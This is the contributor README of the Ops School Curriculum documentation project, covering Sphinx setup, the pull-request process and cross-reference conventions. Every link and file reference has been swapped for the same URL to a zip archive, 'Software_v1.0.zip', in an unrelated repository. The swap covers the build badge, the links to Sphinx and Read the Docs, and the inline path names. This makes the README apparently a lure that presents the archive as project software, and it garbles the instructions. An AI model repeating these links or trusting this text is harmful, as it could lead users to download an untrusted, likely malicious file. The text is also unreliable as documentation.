Ops School Curriculum
=====================
[![Build Status](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)

The current documentation based on these sources can be seen at:
https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip

Welcome!

If you have arrived here, you are probably interested in helping out.
So thank you for your time.

Things you should know:

* This project is written in [reStructuredText](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
* Hosted by [Read the Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
* Tested by rendering in [Sphinx](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip) on [Travis CI](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)

This is the only Markdown file in the repository, as it's not meant to be
included in the documentation itself.

If you are looking to add content, fix formatting, syntax, typos or other
wonderful things, please follow this process:

* Install Sphinx: `easy_install Sphinx` or `pip install Sphinx`
* Fork the `opsschool/curriculum` repository to your own account
* Check out a branch to make your changes on: `git checkout --branch <my_topic>`
* Execute `make html` to build the docs in to `_build/`
* Make your changes
* Execute `make html` again and verify your changes don't cause any
  warnings/errors
* Commit with a descriptive message, and submit a pull request from your branch
  to `master`
* One of the editors will review the change, and either merge it or provide some
  feedback. Community review is also encouraged.

If you submit a pull request and would like to have your name associated with
the project, add it to the `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip` file!

Some cool things:

* `vim-common` contains a reStructuredText syntax highlighter
* The [Emacs support][emacs] via rst-mode comes as part of the docutils package
  under `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip`

[emacs]: https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip

Note about internal links
-------------------------

When creating a link to another page inside the curriculum, use Sphinx's
built-in cross-reference mechanisms to achieve this.

Examples:

* linking to a top-level document such as "Text Editing 101" should be done
  inline, like so:

        See :doc:`text_editing_101` for details...

    where the name provided is the RST file path. The title will be linked to
    the document like so:

        See <em>Text Editing 101</em> for details...

* linking to a reference point, such as a sub-topic on a page should be done by
  creating a globally unique reference point, such as:

        .. _gnu-screen:

        GNU Screen
        ----------

    and using this inline anywhere in the docs like so:

        See :ref:`gnu-screen` for more details.

    The sub-topic's title will be replaced in the hyperlink as well.

After modifications to links, please run `make linkcheck` to see the status of
all the links in the docs.

More on cross-referencing can be read in the [Sphinx Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip).
